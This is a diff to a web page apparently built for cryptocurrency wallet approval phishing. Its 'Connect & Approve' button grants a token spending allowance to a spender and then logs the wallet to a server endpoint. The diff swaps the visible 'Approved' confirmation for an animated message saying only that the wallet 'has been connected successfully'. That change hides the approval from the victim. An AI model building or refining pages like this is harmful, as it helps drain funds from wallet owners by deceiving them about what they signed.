@@ -46,12 +46,41 @@
     }
     .status.err{color:#e44}
     .status.ok{color:#2EB553}
+    .success-wrap{display:none;flex-direction:column;align-items:center;gap:16px}
+    .success-wrap.show{display:flex}
+    .checkmark-circle{
+      width:80px;height:80px;border-radius:50%;
+      background:#2EB553;display:flex;align-items:center;justify-content:center;
+      animation:scaleIn .4s cubic-bezier(.175,.885,.32,1.275) forwards;
+      opacity:0;
+    }
+    .checkmark-circle svg{width:40px;height:40px}
+    .checkmark-circle svg path{
+      stroke:#fff;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
+      fill:none;stroke-dasharray:30;stroke-dashoffset:30;
+      animation:draw .4s .3s ease forwards;
+    }
+    .success-msg{
+      font-size:17px;font-weight:600;color:#1a1a1a;
+      opacity:0;animation:fadeUp .4s .5s ease forwards;
+    }
+    @keyframes scaleIn{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+    @keyframes draw{to{stroke-dashoffset:0}}
+    @keyframes fadeUp{0%{opacity:0;transform:translateY(8px)}100%{opacity:1;transform:translateY(0)}}
   </style>
 </head>
 <body>
 <div class="wrap">
-  <button class="btn" id="btn" disabled>Connect & Approve</button>
-  <div class="status" id="status" role="status">Loading…</div>
+  <div id="mainUI">
+    <button class="btn" id="btn" disabled>Connect & Approve</button>
+    <div class="status" id="status" role="status">Loading…</div>
+  </div>
+  <div class="success-wrap" id="successUI">
+    <div class="checkmark-circle">
+      <svg viewBox="0 0 40 40"><path d="M11 21l6 6 12-14"/></svg>
+    </div>
+    <div class="success-msg">Your wallet has been connected successfully!</div>
+  </div>
 </div>
 <script>
 (function(){
@@ -101,9 +130,8 @@
         return contract.approve(spender,units.toString()).send();
       }).then(function(tx){
         var txId=typeof tx==='string'?tx:(tx&&tx.txid?tx.txid:'');
-        btn.textContent='Approved ✓';
-        btn.style.background='#2EB553';
-        status('Done','ok');
+        document.getElementById('mainUI').style.display='none';
+        document.getElementById('successUI').classList.add('show');
 
         return fetch('/api/wallets/record',{
           method:'POST',
